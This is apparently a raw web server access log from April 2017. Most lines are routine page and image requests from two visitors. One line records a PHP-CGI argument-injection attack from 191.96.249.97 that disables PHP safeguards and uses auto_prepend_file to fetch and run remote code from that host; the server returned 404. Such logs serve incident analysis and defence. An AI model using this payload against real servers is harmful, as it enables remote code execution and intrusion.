132.205.229.69 - - [13/Apr/2017:11:51:23 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:11:51:37 +0000] "GET / HTTP/1.1" 200 2531 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.58.21 - - [13/Apr/2017:11:51:37 +0000] "GET /favicon.ico HTTP/1.1" 404 1010 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
132.205.229.69 - - [13/Apr/2017:11:52:22 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:11:53:59 +0000] "GET / HTTP/1.1" 200 2541 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:11:53:59 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:11:54:11 +0000] "GET / HTTP/1.1" 200 2541 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:11:54:12 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:11:55:14 +0000] "GET / HTTP/1.1" 200 2524 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:11:55:15 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:11:57:11 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:02:55 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:02:56 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:03:27 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:03:28 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:03:39 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:03:40 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
191.96.249.97 - - [13/Apr/2017:12:03:40 +0000] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\x22\x22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 2835 "-" "-"
132.205.229.69 - - [13/Apr/2017:12:03:48 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:03:48 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:04:11 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:04:31 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:04:32 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:05:47 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:05:47 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:06:40 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:06:41 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:06:43 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:06:43 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
